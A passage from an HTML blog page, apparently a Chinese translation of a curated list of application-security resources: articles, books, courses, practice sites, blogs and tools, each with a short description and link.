(2015)</a></li><li><a href="#警惕多次使用一次性密钥和其他奇葩的加密方式-2015"><a href="https://freedom-to-tinker.com/blog/jbonneau/be-wary-of-one-time-pads-and-other-crypto-unicorns/" target="_blank" rel="external">警惕多次使用一次性密钥和其他奇葩的加密方式</a> (2015)</a></li></ul></li><li><a href="#书籍">书籍</a><ul><li><a href="#作为一个渗透测试学习者必知必读的好书推荐"><a href="https://zhuanlan.zhihu.com/p/23561475" target="_blank" rel="external">作为一个渗透测试学习者必知必读的好书推荐</a></a></li><li><a href="#作为一个二进制安全学习者必知必读的书籍推荐"><a href="https://zhuanlan.zhihu.com/p/23574346" target="_blank" rel="external">作为一个二进制安全学习者必知必读的书籍推荐</a></a></li><li><a href="#-web应用黑客手册-2011"><a href="http://mdsec.net/wahh" target="_blank" rel="external">Web应用黑客手册</a> (2011)</a></li><li><a href="#-密码学工程设计原理与实践应用--2010"><a href="http://www.amazon.com/Cryptography-Engineering-Principles-Practical-Applications/dp/0470474246" target="_blank" rel="external">密码学工程：设计原理与实践应用 </a>(2010)</a></li><li><a href="#-python灰帽子黑客与逆向工程师的python编程之道-2009"><a href="http://www.amazon.com/Gray-Hat-Python-Programming-Engineers/dp/1593271921" target="_blank" rel="external">Python灰帽子：黑客与逆向工程师的Python编程之道</a> (2009)</a></li><li><a href="#-软件安全评估的艺术识别与防范软件-2006"><a href="http://www.amazon.com/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426/" target="_blank" rel="external">软件安全评估的艺术:识别与防范软件</a> (2006)</a></li><li><a href="#-c语言接口与实现创建可重用软件的技术-1996"><a href="http://www.amazon.com/Interfaces-Implementations-Techniques-Creating-Reusable/dp/0201498413/" target="_blank" rel="external">C语言接口与实现：创建可重用软件的技术</a> (1996)</a></li><li><a href="#-逆向逆向工程的秘密-2005"><a href="http://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817" target="_blank" rel="external">逆向：逆向工程的秘密</a> (2005)</a></li><li><a href="#-javascript语言精粹-2008"><a href="http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742" target="_blank" rel="external">JavaScript语言精粹</a> (2008)</a></li><li><a href="#-windows内部实现囊括windows-server-2008和windows-vista-2007"><a href="http://www.amazon.com/Windows®-Internals-Including-Developer-Reference/dp/0735625301" target="_blank" rel="external">Windows内部实现:囊括Windows Server 2008和Windows Vista</a> (2007)</a></li><li><a href="#-mac黑客手册-2009"><a href="http://www.amazon.com/The-Hackers-Handbook-Charlie-Miller/dp/0470395362" target="_blank" rel="external">Mac黑客手册</a> (2009)</a></li><li><a href="#-ida-pro权威指南世界上最受欢迎反汇编者的非正式指南-2008"><a href="http://www.amazon.com/The-IDA-Pro-Book-Disassembler/dp/1593271786" target="_blank" rel="external">IDA Pro权威指南:世界上最受欢迎反汇编者的非正式指南</a> (2008)</a></li><li><a href="#-用tcpip进行网际互连第2卷设计实现与内核ansi-c版第3版-1998"><a href="http://www.amazon.com/Internetworking-TCP-Vol-Implementation-Internals/dp/0139738436" target="_blank" rel="external">用TCP/IP进行网际互连（第2卷）：设计、实现与内核（ANSI C版）（第3版）</a> (1998)</a></li><li><a href="#-网络算法设计快速网络设备的跨学科方法-2004"><a href="http://www.amazon.com/Network-Algorithmics-Interdisciplinary-Designing-Networking/dp/0120884771" target="_blank" rel="external">网络算法：设计快速网络设备的跨学科方法</a> (2004)</a></li><li><a href="#-计算机结构-麻省理工学院电子电气工程与计算机科学系教材-1989"><a href="http://www.amazon.com/Computation-Structures-Electrical-Engineering-Computer/dp/0262231395" target="_blank" rel="external">计算机结构 (麻省理工学院电子电气工程与计算机科学系教材)</a> (1989)</a></li><li><a href="#-软件加密与解密-2009"><a href="http://www.amazon.com/Surreptitious-Software-Obfuscation-Watermarking-Tamperproofing/dp/0321549252" target="_blank" rel="external">软件加密与解密</a> (2009)</a></li><li><a href="#安全编程开发安全程序-2015"><a href="http://www.dwheeler.com/secure-programs/" target="_blank" rel="external">安全编程：开发安全程序</a> (2015)</a></li><li><a href="#安全工程构建可靠分布式系统指南第二版-2008"><a href="https://www.cl.cam.ac.uk/~rja14/book.html" target="_blank" rel="external">安全工程：构建可靠分布式系统指南（第二版）</a> (2008)</a></li><li><a href="#-防弹ssl和tls理解和部署ssltls和pki以保护服务器和web应用安全-2014"><a href="https://www.feistyduck.com/books/bulletproof-ssl-and-tls/" target="_blank" rel="external">防弹SSL和TLS：理解和部署SSL/TLS和PKI以保护服务器和Web应用安全</a> (2014)</a></li></ul></li><li><a href="#课程">课程</a><ul><li><a href="#计算机安全攻击cis-4930fsu"><a href="https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/" target="_blank" rel="external">计算机安全攻击（CIS 4930）FSU</a></a></li><li><a href="#黑客之夜"><a href="https://github.com/isislab/Hack-Night" target="_blank" rel="external">黑客之夜</a></a></li></ul></li><li><a href="#网站">网站</a><ul><li><a href="#hack-this-site"><a href="http://www.hackthissite.org" target="_blank" rel="external">Hack This Site!</a></a></li><li><a href="#enigma-group"><a href="http://www.enigmagroup.org" target="_blank" rel="external">Enigma Group</a></a></li><li><a href="#web-app-sec-quiz"><a href="https://timoh6.github.io/WebAppSecQuiz/" target="_blank" rel="external">Web App Sec Quiz</a></a></li><li><a href="#securepasswordsinfo"><a href="https://securepasswords.info" target="_blank" rel="external">SecurePasswords.info</a></a></li><li><a href="#security-news-feeds-cheat-sheet"><a href="http://lzone.de/cheat-sheet/Security-News-Feeds" target="_blank" rel="external">Security News Feeds Cheat-Sheet</a></a></li><li><a href="#open-security-training"><a href="http://opensecuritytraining.info/" target="_blank" rel="external">Open Security Training</a></a></li><li><a href="#microcorruption"><a href="https://microcorruption.com/login" target="_blank" rel="external">MicroCorruption</a></a></li><li><a href="#the-matasano-crypto-challenges"><a href="http://cryptopals.com" target="_blank" rel="external">The Matasano Crypto Challenges</a></a></li><li><a href="#pentesterlab"><a href="https://pentesterlab.com" target="_blank" rel="external">PentesterLab</a></a></li><li><a href="#juice-shop"><a href="https://bkimminich.github.io/juice-shop" target="_blank" rel="external">Juice Shop</a></a></li><li><a href="#supercar-showdown"><a href="http://hackyourselffirst.troyhunt.com/" target="_blank" rel="external">Supercar Showdown</a></a></li><li><a href="#博客">博客</a><ul><li><a href="#crypto-fails"><a href="http://cryptofails.com" target="_blank" rel="external">Crypto Fails</a></a></li><li><a href="#ncc-group"><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/" target="_blank" rel="external">NCC Group</a></a></li><li><a href="#scott-helme"><a href="https://scotthelme.co.uk" target="_blank" rel="external">Scott Helme</a></a></li></ul></li><li><a href="#wiki">Wiki</a><ul><li><a href="#owasp-top-ten-project"><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="external">OWASP Top Ten Project</a></a></li></ul></li><li><a href="#工具">工具</a><ul><li><a href="#qualys-ssl-labs"><a href="https://www.ssllabs.com/" target="_blank" rel="external">Qualys SSL Labs</a></a></li><li><a href="#securityheadersio"><a href="https://securityheaders.io/" target="_blank" rel="external">securityheaders.io</a></a></li><li><a href="#report-uriio"><a href="https://report-uri.io" target="_blank" rel="external">report-uri.io</a></a></li></ul></li></ul></li></ul></li><li><a href="#android">Android</a><ul><li><a href="#书籍-1">书籍</a><ul><li><a href="#android安全编码标准-2015"><a href="https://www.securecoding.cert.org/confluence/display/android/Android Secure Coding Standard" target="_blank" rel="external">Android安全编码标准</a> (2015)</a></li></ul></li></ul></li><li><a href="#c">C</a><ul><li><a href="#书籍-2">书籍</a><ul><li><a href="#c安全编码标准-2006"><a href="https://www.securecoding.cert.org/confluence/display/c/SEI CERT C Coding Standard" target="_blank" rel="external">C安全编码标准</a> (2006)</a></li><li><a href="#防御性编码fedora安全团队提高软件安全指南-2016"><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/index.html" target="_blank" rel="external">防御性编码：Fedora安全团队提高软件安全指南</a> (2016)</a></li></ul></li></ul></li><li><a href="#c-1">C</a><ul><li><a href="#书籍-3">书籍</a><ul><li><a href="#c安全编码标准-2006-1"><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637" target="_blank" rel="external">C 安全编码标准</a> (2006)</a></li></ul></li></ul></li><li><a href="#c-sharp">C Sharp</a><ul><li><a href="#书籍-4">书籍</a><ul><li><a href="#-安全驱动net-2015"><a href="http://securitydriven.net/" target="_blank" rel="external">安全驱动.NET</a> (2015)</a></li></ul></li></ul></li><li><a href="#java">Java</a><ul><li><a href="#书籍-5">书籍</a><ul><li><a href="#java安全编码标准-2007"><a href="https://www.securecoding.cert.org/confluence/display/java/SEI CERT Oracle Coding Standard for Java" target="_blank" rel="external">Java安全编码标准</a> (2007)</a></li><li><a href="#java-se安全编指南-2014"><a href="http://www.oracle.com/technetwork/java/seccodeguide-139067.html" target="_blank" rel="external">Java SE安全编指南</a> (2014)</a></li></ul></li></ul></li><li><a href="#nodejs">Node.js</a><ul><li><a href="#文章-1">文章</a><ul><li><a href="#nodejs安全检查清单-2015"><a href="https://blog.risingstack.com/node-js-security-checklist/" target="_blank" rel="external">Node.js安全检查清单</a> (2015)</a></li></ul></li><li><a href="#培训">培训</a><ul><li><a href="#-lift-security团队的安全培训"><a href="https://liftsecurity.io/training" target="_blank" rel="external">Lift Security团队的安全培训</a></a></li></ul></li></ul></li><li><a href="#perl">Perl</a><ul><li><a href="#书籍-6">书籍</a><ul><li><a href="#perl安全编码标准-2011"><a href="https://www.securecoding.cert.org/confluence/display/perl/SEI CERT Perl Coding Standard" target="_blank" rel="external">Perl安全编码标准</a> (2011)</a></li></ul></li></ul></li><li><a href="#python">Python</a><ul><li><a href="#书籍-7">书籍</a><ul><li><a href="#fedora防御编码指南中的python章节"><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/chap-Defensive_Coding-Python.html" target="_blank" rel="external">Fedora防御编码指南中的Python章节</a></a></li><li><a href="#-violent-python"><a href="http://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579" target="_blank" rel="external">Violent Python</a></a></li></ul></li><li><a href="#网站-1">网站</a><ul><li><a href="#开放式web应用程序安全项目中的python安全wiki-2014"><a href="https://github.com/ebranca/owasp-pysec/wiki" target="_blank" rel="external">开放式Web应用程序安全项目中的Python安全Wiki</a> (2014)</a></li></ul></li></ul></li><li><a href="#ruby">Ruby</a><ul><li><a href="#书籍-8">书籍</a><ul><li><a href="#ruby安全开发指南-2014"><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Secure_Ruby_Development_Guide/index.html" target="_blank" rel="external">Ruby安全开发指南</a> (2014)</a></li></ul></li></ul></li><li><a href="#php">PHP</a><ul><li><a href="#文章-2">文章</a><ul><li><a href="#关于时间的一切-2014"><a href="http://blog.ircmaxell.com/2014/11/its-all-about-time.html" target="_blank" rel="external">关于时间的一切</a> (2014)</a></li><li><a href="#实现php长期持久性安全认证-2015"><a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence" target="_blank" rel="external">实现PHP长期持久性安全认证</a> (2015)</a></li><li><a href="#php中防止跨站脚本攻击20个点子-2013"><a href="http://blog.astrumfutura.com/2013/04/20-point-list-for-preventing-cross-site-scripting-in-php" target="_blank" rel="external">PHP中防止跨站脚本攻击20个点子</a> (2013)</a></li><li><a href="#针对系统管理员最佳php安全配置25点建议-2011"><a href="http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html" target="_blank" rel="external">针对系统管理员最佳PHP安全配置25点建议</a> (2011)</a></li><li><a href="#php数据加密入门介绍-2014"><a href="https://timoh6.github.io/2014/06/16/PHP-data-encryption-cheatsheet.html" target="_blank" rel="external">PHP数据加密入门介绍</a> (2014)</a></li><li><a href="#php应用程序防止sql注入简明指南-2014"><a href="https://paragonie.com/blog/2015/05/preventing-sql-injection-in-php-applications-easy-and-definitive-guide" target="_blank" rel="external">PHP应用程序防止SQL注入简明指南</a> (2014)</a></li><li><a href="#你不该使用base64密码-2015"><a href="https://paragonie.com/blog/2015/08/you-wouldnt-base64-a-password-cryptography-decoded" target="_blank" rel="external">你不该使用Base64密码</a> (2015)</a></li><li><a href="#php应用程序安全数据加密指南-2015"><a href="https://paragonie.com/white-paper/2015-secure-php-data-encryption" target="_blank" rel="external">PHP应用程序安全数据加密指南</a> (2015)</a></li></ul></li><li><a href="#书籍-9">书籍</a><ul><li><a href="#-php安全核心理念"><a href="https://leanpub.com/securingphp-coreconcepts" target="_blank" rel="external">PHP安全：核心理念</a></a></li><li><a href="#php项目中使用libsodium"><a href="https://paragonie.com/book/pecl-libsodium" target="_blank" rel="external">PHP项目中使用Libsodium</a></a></li></ul></li><li><a href="#干货库">干货库</a><ul><li><a href="#defusephp-encryption"><a href="https://github.com/defuse/php-encryption" target="_blank" rel="external">defuse/php-encryption</a></a></li><li><a href="#ircmaxellpassword_compat"><a href="https://github.com/ircmaxell/password_compat" target="_blank" rel="external">ircmaxell/password_compat</a></a></li><li><a href="#ircmaxellrandomlib"><a href="https://github.com/ircmaxell/RandomLib" target="_blank" rel="external">ircmaxell/RandomLib</a></a></li><li><a href="#thephpleagueoauth2-server"><a href="https://github.com/thephpleague/oauth2-server" target="_blank" rel="external">thephpleague/oauth2-server</a></a></li><li><a href="#paragonierandom_compat"><a href="https://github.com/paragonie/random_compat" target="_blank" rel="external">paragonie/random_compat</a></a></li><li><a href="#pseciogatekeeper"><a href="https://github.com/psecio/gatekeeper" target="_blank" rel="external">psecio/gatekeeper</a></a></li><li><a href="#openwallphpass"><a href="http://www.openwall.com/phpass/" target="_blank" rel="external">openwall/phpass</a></a></li></ul></li><li><a href="#网站-2">网站</a><ul><li><a href="#websecio"><a href="http://websec.io" target="_blank" rel="external">websec.io</a></a></li><li><a href="#博客-1">博客</a><ul><li><a href="#paragon-initiative-enterprises-blog"><a href="https://paragonie.com/blog/" target="_blank" rel="external">Paragon Initiative Enterprises Blog</a></a></li><li><a href="#ircmaxells-blog"><a href="http://blog.ircmaxell.com" target="_blank" rel="external">ircmaxell’s blog</a></a></li><li><a href="#pádraic-bradys-blog"><a href="http://blog.astrumfutura.com" target="_blank" rel="external">Pádraic Brady’s Blog</a></a></li></ul></li><li><a href="#订阅-1">订阅</a><ul><li><a href="#securing-php-weekly"><a href="http://securingphp.com" target="_blank" rel="external">Securing PHP Weekly</a></a></li></ul></li></ul></li></ul></li></ul><a id="more"></a><h1 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><h3 id="如何安全地生成随机数-2014"><a href="#如何安全地生成随机数-2014" class="headerlink" title="如何安全地生成随机数 (2014)"></a><a href="http://sockpuppet.org/blog/2014/02/25/safely-generate-random-numbers/" target="_blank" rel="external">如何安全地生成随机数</a> (2014)</h3><p>关于加密安全中的伪随机数生成器的建议。</p><h3 id="加盐哈希密码的正确姿势-2014"><a href="#加盐哈希密码的正确姿势-2014" class="headerlink" title="加盐哈希密码的正确姿势 (2014)"></a><a href="https://crackstation.net/hashing-security.htm" target="_blank" rel="external">加盐哈希密码的正确姿势</a> (2014)</h3><p><a href="https://crackstation.net" target="_blank" rel="external">Crackstation</a>上的一篇文章, <a href="https://defuse.ca" target="_blank" rel="external">Defuse Security</a>的一个项目。</p><h3 id="dev-urandom不当使用-2014"><a href="#dev-urandom不当使用-2014" class="headerlink" title="/dev/urandom不当使用 (2014)"></a><a href="http://insanecoding.blogspot.co.uk/2014/05/a-good-idea-with-bad-usage-devurandom.html" target="_blank" rel="external">/dev/urandom不当使用</a> (2014)</h3><p>在Linux/BSD上提及了许多使 <code>/dev/urandom</code>失效的方法。</p><h3 id="Why-Invest-in-Application-Security-2015"><a href="#Why-Invest-in-Application-Security-2015" class="headerlink" title="Why Invest in Application Security? (2015)"></a><a href="https://paragonie.com/white-paper/2015-why-invest-application-security" target="_blank" rel="external">Why Invest in Application Security?</a> (2015)</h3><p>经营业务需要具有成本意识，并尽量减少不必要的支出。确保您的应用程序的安全性的好处对于大多数公司来说是不可见的，因此通常他们忽视投资于安全软件开发作为一种节省成本的措施，然而这些公司并没有意识到的潜在的数据泄露威胁，<strong>平均数据泄露造成数百万美元的损失</strong>，因此对于大多数公司来说投入更多的时间和人力开发安全软件是值得的，能尽量减少这种风险。</p><h3 id="警惕多次使用一次性密钥和其他奇葩的加密方式-2015"><a href="#警惕多次使用一次性密钥和其他奇葩的加密方式-2015" class="headerlink" title="警惕多次使用一次性密钥和其他奇葩的加密方式 (2015)"></a><a href="https://freedom-to-tinker.com/blog/jbonneau/be-wary-of-one-time-pads-and-other-crypto-unicorns/" target="_blank" rel="external">警惕多次使用一次性密钥和其他奇葩的加密方式</a> (2015)</h3><p>任何想要够建立加密功能的开发者<strong>必读</strong>的好文。</p><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><h3 id="作为一个渗透测试学习者必知必读的好书推荐"><a href="#作为一个渗透测试学习者必知必读的好书推荐" class="headerlink" title="作为一个渗透测试学习者必知必读的好书推荐"></a><a href="https://zhuanlan.zhihu.com/p/23561475" target="_blank" rel="external">作为一个渗透测试学习者必知必读的好书推荐</a></h3><h3 id="作为一个二进制安全学习者必知必读的书籍推荐"><a href="#作为一个二进制安全学习者必知必读的书籍推荐" class="headerlink" title="作为一个二进制安全学习者必知必读的书籍推荐"></a><a href="https://zhuanlan.zhihu.com/p/23574346" target="_blank" rel="external">作为一个二进制安全学习者必知必读的书籍推荐</a></h3><h3 id="Web应用黑客手册-2011"><a href="#Web应用黑客手册-2011" class="headerlink" title="Web应用黑客手册 (2011)"></a><a href="http://mdsec.net/wahh" target="_blank" rel="external">Web应用黑客手册</a> (2011)</h3><h3 id="密码学工程：设计原理与实践应用-2010"><a href="#密码学工程：设计原理与实践应用-2010" class="headerlink" title="密码学工程：设计原理与实践应用  (2010)"></a><a href="http://www.amazon.com/Cryptography-Engineering-Principles-Practical-Applications/dp/0470474246" target="_blank" rel="external">密码学工程：设计原理与实践应用 </a>(2010)</h3><h3 id="Python灰帽子：黑客与逆向工程师的Python编程之道-2009"><a href="#Python灰帽子：黑客与逆向工程师的Python编程之道-2009" class="headerlink" title="Python灰帽子：黑客与逆向工程师的Python编程之道 (2009)"></a><a href="http://www.amazon.com/Gray-Hat-Python-Programming-Engineers/dp/1593271921" target="_blank" rel="external">Python灰帽子：黑客与逆向工程师的Python编程之道</a> (2009)</h3><h3 id="软件安全评估的艺术-识别与防范软件-2006"><a href="#软件安全评估的艺术-识别与防范软件-2006" class="headerlink" title="软件安全评估的艺术:识别与防范软件 (2006)"></a><a href="http://www.amazon.com/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426/" target="_blank" rel="external">软件安全评估的艺术:识别与防范软件</a> (2006)</h3><h3 id="C语言接口与实现：创建可重用软件的技术-1996"><a href="#C语言接口与实现：创建可重用软件的技术-1996" class="headerlink" title="C语言接口与实现：创建可重用软件的技术 (1996)"></a><a href="http://www.amazon.com/Interfaces-Implementations-Techniques-Creating-Reusable/dp/0201498413/" target="_blank" rel="external">C语言接口与实现：创建可重用软件的技术</a> (1996)</h3><h3 id="逆向：逆向工程的秘密-2005"><a href="#逆向：逆向工程的秘密-2005" class="headerlink" title="逆向：逆向工程的秘密 (2005)"></a><a href="http://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817" target="_blank" rel="external">逆向：逆向工程的秘密</a> (2005)</h3><h3 id="JavaScript语言精粹-2008"><a href="#JavaScript语言精粹-2008" class="headerlink" title="JavaScript语言精粹 (2008)"></a><a href="http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742" target="_blank" rel="external">JavaScript语言精粹</a> (2008)</h3><h3 id="Windows内部实现-囊括Windows-Server-2008和Windows-Vista-2007"><a href="#Windows内部实现-囊括Windows-Server-2008和Windows-Vista-2007" class="headerlink" title="Windows内部实现:囊括Windows Server 2008和Windows Vista (2007)"></a><a href="http://www.amazon.com/Windows%C2%AE-Internals-Including-Developer-Reference/dp/0735625301" target="_blank" rel="external">Windows内部实现:囊括Windows Server 2008和Windows Vista</a> (2007)</h3><h3 id="Mac黑客手册-2009"><a href="#Mac黑客手册-2009" class="headerlink" title="Mac黑客手册 (2009)"></a><a href="http://www.amazon.com/The-Hackers-Handbook-Charlie-Miller/dp/0470395362" target="_blank" rel="external">Mac黑客手册</a> (2009)</h3><h3 id="IDA-Pro权威指南-世界上最受欢迎反汇编者的非正式指南-2008"><a href="#IDA-Pro权威指南-世界上最受欢迎反汇编者的非正式指南-2008" class="headerlink" title="IDA Pro权威指南:世界上最受欢迎反汇编者的非正式指南 (2008)"></a><a href="http://www.amazon.com/The-IDA-Pro-Book-Disassembler/dp/1593271786" target="_blank" rel="external">IDA Pro权威指南:世界上最受欢迎反汇编者的非正式指南</a> (2008)</h3><h3 id="用TCP-IP进行网际互连（第2卷）：设计、实现与内核（ANSI-C版）（第3版）-1998"><a href="#用TCP-IP进行网际互连（第2卷）：设计、实现与内核（ANSI-C版）（第3版）-1998" class="headerlink" title="用TCP/IP进行网际互连（第2卷）：设计、实现与内核（ANSI C版）（第3版） (1998)"></a><a href="http://www.amazon.com/Internetworking-TCP-Vol-Implementation-Internals/dp/0139738436" target="_blank" rel="external">用TCP/IP进行网际互连（第2卷）：设计、实现与内核（ANSI C版）（第3版）</a> (1998)</h3><h3 id="网络算法：设计快速网络设备的跨学科方法-2004"><a href="#网络算法：设计快速网络设备的跨学科方法-2004" class="headerlink" title="网络算法：设计快速网络设备的跨学科方法 (2004)"></a><a href="http://www.amazon.com/Network-Algorithmics-Interdisciplinary-Designing-Networking/dp/0120884771" target="_blank" rel="external">网络算法：设计快速网络设备的跨学科方法</a> (2004)</h3><h3 id="计算机结构-麻省理工学院电子电气工程与计算机科学系教材-1989"><a href="#计算机结构-麻省理工学院电子电气工程与计算机科学系教材-1989" class="headerlink" title="计算机结构 (麻省理工学院电子电气工程与计算机科学系教材) (1989)"></a><a href="http://www.amazon.com/Computation-Structures-Electrical-Engineering-Computer/dp/0262231395" target="_blank" rel="external">计算机结构 (麻省理工学院电子电气工程与计算机科学系教材)</a> (1989)</h3><h3 id="软件加密与解密-2009"><a href="#软件加密与解密-2009" class="headerlink" title="软件加密与解密 (2009)"></a><a href="http://www.amazon.com/Surreptitious-Software-Obfuscation-Watermarking-Tamperproofing/dp/0321549252" target="_blank" rel="external">软件加密与解密</a> (2009)</h3><h3 id="安全编程：开发安全程序-2015"><a href="#安全编程：开发安全程序-2015" class="headerlink" title="安全编程：开发安全程序 (2015)"></a><a href="http://www.dwheeler.com/secure-programs/" target="_blank" rel="external">安全编程：开发安全程序</a> (2015)</h3><h3 id="安全工程：构建可靠分布式系统指南（第二版）-2008"><a href="#安全工程：构建可靠分布式系统指南（第二版）-2008" class="headerlink" title="安全工程：构建可靠分布式系统指南（第二版） (2008)"></a><a href="https://www.cl.cam.ac.uk/~rja14/book.html" target="_blank" rel="external">安全工程：构建可靠分布式系统指南（第二版）</a> (2008)</h3><h3 id="防弹SSL和TLS：理解和部署SSL-TLS和PKI以保护服务器和Web应用安全-2014"><a href="#防弹SSL和TLS：理解和部署SSL-TLS和PKI以保护服务器和Web应用安全-2014" class="headerlink" title="防弹SSL和TLS：理解和部署SSL/TLS和PKI以保护服务器和Web应用安全 (2014)"></a><a href="https://www.feistyduck.com/books/bulletproof-ssl-and-tls/" target="_blank" rel="external">防弹SSL和TLS：理解和部署SSL/TLS和PKI以保护服务器和Web应用安全</a> (2014)</h3><h2 id="课程"><a href="#课程" class="headerlink" title="课程"></a>课程</h2><h3 id="计算机安全攻击（CIS-4930）FSU"><a href="#计算机安全攻击（CIS-4930）FSU" class="headerlink" title="计算机安全攻击（CIS 4930）FSU"></a><a href="https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/" target="_blank" rel="external">计算机安全攻击（CIS 4930）FSU</a></h3><p>佛罗里达州立大学Owen Redwood教授的漏洞研究和攻击课程。</p><p><strong>一定要看看<a href="https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/lectures.html" target="_blank" rel="external">讲座</a>！</strong></p><h3 id="黑客之夜"><a href="#黑客之夜" class="headerlink" title="黑客之夜"></a><a href="https://github.com/isislab/Hack-Night" target="_blank" rel="external">黑客之夜</a></h3><p>由纽约大学理工学院的旧渗透测试和漏洞分析课程发展而来，黑客之夜课程清晰明了地介绍各种安全攻击。</p><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><h3 id="Hack-This-Site"><a href="#Hack-This-Site" class="headerlink" title="Hack This Site!"></a><a href="http://www.hackthissite.org" target="_blank" rel="external">Hack This Site!</a></h3><p>通过尝试黑掉网站了解应用程序安全。</p><h3 id="Enigma-Group"><a href="#Enigma-Group" class="headerlink" title="Enigma Group"></a><a href="http://www.enigmagroup.org" target="_blank" rel="external">Enigma Group</a></h3><p>黑客和安全专家训练靶场。</p><h3 id="Web-App-Sec-Quiz"><a href="#Web-App-Sec-Quiz" class="headerlink" title="Web App Sec Quiz"></a><a href="https://timoh6.github.io/WebAppSecQuiz/" target="_blank" rel="external">Web App Sec Quiz</a></h3><p>自我评估测验Web应用安全。</p><h3 id="SecurePasswords-info"><a href="#SecurePasswords-info" class="headerlink" title="SecurePasswords.info"></a><a href="https://securepasswords.info" target="_blank" rel="external">SecurePasswords.info</a></h3><p>在几种语言/框架中安全的密码。</p><h3 id="Security-News-Feeds-Cheat-Sheet"><a href="#Security-News-Feeds-Cheat-Sheet" class="headerlink" title="Security News Feeds Cheat-Sheet"></a><a href="http://lzone.de/cheat-sheet/Security-News-Feeds" target="_blank" rel="external">Security News Feeds Cheat-Sheet</a></h3><p>有关安全新闻来源列表。</p><h3 id="Open-Security-Training"><a href="#Open-Security-Training" class="headerlink" title="Open Security Training"></a><a href="http://opensecuritytraining.info/" target="_blank" rel="external">Open Security Training</a></h3><p>有关开放的x86编程，黑客和取证培训的视频课程。</p><h3 id="MicroCorruption"><a href="#MicroCorruption" class="headerlink" title="MicroCorruption"></a><a href="https://microcorruption.com/login" target="_blank" rel="external">MicroCorruption</a></h3><p>CTF比赛形式地学习汇编和嵌入式设备安全。</p><h3 id="The-Matasano-Crypto-Challenges"><a href="#The-Matasano-Crypto-Challenges" class="headerlink" title="The Matasano Crypto Challenges"></a><a href="http://cryptopals.com" target="_blank" rel="external">The Matasano Crypto Challenges</a></h3><p>由<a href="http://matasano.com" target="_blank" rel="external">Matasano Security</a>编写的一系列编程练习，Maciej Ceglowski给了详细<a href="https://blog.pinboard.in/2013/04/the_matasano_crypto_challenges" target="_blank" rel="external">介绍</a>。</p><h3 id="PentesterLab"><a href="#PentesterLab" class="headerlink" title="PentesterLab"></a><a href="https://pentesterlab.com" target="_blank" rel="external">PentesterLab</a></h3><p>PentesterLab提供<a href="https://pentesterlab.com/exercises/" target="_blank" rel="external">免费的实践练习</a> 和<a href="https://pentesterlab.com/bootcamp/" target="_blank" rel="external">学习规划指南</a> 。</p><h3 id="Juice-Shop"><a href="#Juice-Shop" class="headerlink" title="Juice Shop"></a><a href="https://bkimminich.github.io/juice-shop" target="_blank" rel="external">Juice Shop</a></h3><p>存在安全隐患的Javascript Web应用程序练习靶场。</p><h3 id="Supercar-Showdown"><a href="#Supercar-Showdown" class="headerlink" title="Supercar Showdown"></a><a href="http://hackyourselffirst.troyhunt.com/" target="_blank" rel="external">Supercar Showdown</a></h3><p>通过学习实际的网络攻击来提高自身的安全技能。</p><h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><h4 id="Crypto-Fails"><a href="#Crypto-Fails" class="headerlink" title="Crypto Fails"></a><a href="http://cryptofails.com" target="_blank" rel="external">Crypto Fails</a></h4><p>详解具有安全隐患的加密技术。</p><h4 id="NCC-Group"><a href="#NCC-Group" class="headerlink" title="NCC Group"></a><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/" target="_blank" rel="external">NCC Group</a></h4><p>国家计算中心（National Computing Centre）博客</p><h4 id="Scott-Helme"><a href="#Scott-Helme" class="headerlink" title="Scott Helme"></a><a href="https://scotthelme.co.uk" target="_blank" rel="external">Scott Helme</a></h4><p>学习有关安全和性能方面的知识。</p><h3 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h3><h4 id="OWASP-Top-Ten-Project"><a href="#OWASP-Top-Ten-Project" class="headerlink" title="OWASP Top Ten Project"></a><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="external">OWASP Top Ten Project</a></h4><p>Web应用程序中常见的十大安全漏洞。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="Qualys-SSL-Labs"><a href="#Qualys-SSL-Labs" class="headerlink" title="Qualys SSL Labs"></a><a href="https://www.ssllabs.com/" target="_blank" rel="external">Qualys SSL Labs</a></h4><p>著名的SSL和TLS攻击工具套件。</p><h4 id="securityheaders-io"><a href="#securityheaders-io" class="headerlink" title="securityheaders.io"></a><a href="https://securityheaders.io/" target="_blank" rel="external">securityheaders.io</a></h4><p>轻松快速地评估HTTP响应标头的安全性。</p><h4 id="report-uri-io"><a href="#report-uri-io" class="headerlink" title="report-uri.io"></a><a href="https://report-uri.io" target="_blank" rel="external">report-uri.io</a></h4><p>免费的内容安全策略（Content Security Policy，CSP）和HTTP公钥钉扎（HTTP Public Key Pinning，HPKP）报告服务。</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="书籍-1"><a href="#书籍-1" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Android安全编码标准-2015"><a href="#Android安全编码标准-2015" class="headerlink" 